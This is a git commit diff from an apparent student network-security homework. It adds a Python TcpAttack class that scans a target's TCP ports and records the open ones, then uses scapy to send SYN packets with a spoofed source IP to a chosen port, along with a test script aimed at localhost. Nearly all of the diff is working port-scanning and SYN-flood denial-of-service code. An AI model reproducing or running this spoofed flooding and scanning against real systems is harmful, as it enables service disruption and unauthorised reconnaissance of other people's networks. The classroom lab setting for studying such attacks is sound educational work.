efb78d8375d727163ec4a9a221d3730dc7c7b812
PadNim14 <npadmana@purdue.edu>
2023-03-13 17:39:21 -0400

    current progress on HW8

--- HW8/TcpAttack.py
+++ HW8/TcpAttack.py
@@ -1,11 +1,55 @@
+from scapy.all import *
+import socket
+
 class TcpAttack:
 
     def __init__(self, spoofIP, targetIP):
-        pass
+        self.spoofIP = spoofIP
+        self.targetIP = targetIP
+    
 
     def scanTarget(self, rangeStart, rangeEnd):
-        pass
+        OUTPUT_FILE = open('openports.txt', 'w')
+        # print("------------Scanning Target Ports----------------------")
+        verbosity = 0
+        open_ports = []
+        for testport in range(rangeStart, rangeEnd + 1):
+            # print("Testing port ", testport)
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(0.1)
+            try:
+                # print("made it here")
+                sock.connect((self.targetIP, testport))
+                # print(self.targetIP)
+                open_ports.append(testport)
+                if verbosity: 
+                    print("Port opened: ", testport)
+
+            except:
+                if verbosity: 
+                    print("Port closed: ", testport)
+
+        for port in open_ports:
+            OUTPUT_FILE.write(str(port) + "\n")
+        
+        OUTPUT_FILE.close()
 
     def attackTarget(self, port, numSyn):
-        pass
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(0.1)
+        try:
+            for i in range(numSyn):
+                IP_header = scapy.all.IP(src=self.spoofIP, dst=self.targetIP)
+                TCP_header = scapy.all.TCP(flags='S', sport=RandShort(), dport=int(port))
+                packet = IP_header / TCP_header
+                try:
+                    send(packet)
+                except Exception as error:
+                    print(error)
+        except:
+            print("attack failed :(")
+            print(error)
+
+        
+    
     
--- HW8/testTcpAttack.py
+++ HW8/testTcpAttack.py
@@ -1,8 +1,13 @@
 from TcpAttack import *
 
-spoofIP = '10.1.1.1' ; targetIP = '10.1.1.2'
-rangeStart = int ; rangeEnd = int; port = int
-Tcp = TcpAttack(spoofIP, targetIP)
-Tcp.scanTarget(rangeStart, rangeEnd)
-if Tcp.attackTarget(port, 10):
-    print('port was open to attack')
+if __name__ == "__main__":
+    # spoofIP = '127.0.0.2' ; targetIP = '127.0.0.1'
+    spoofIP = '127.0.0.4'
+    targetIP = '127.0.0.1'
+    rangeStart = 1 
+    rangeEnd = 1024
+    port = 22
+    Tcp = TcpAttack(spoofIP, targetIP)
+    Tcp.scanTarget(rangeStart, rangeEnd)
+    if Tcp.attackTarget(port, 10):
+        print('port was open to attack')
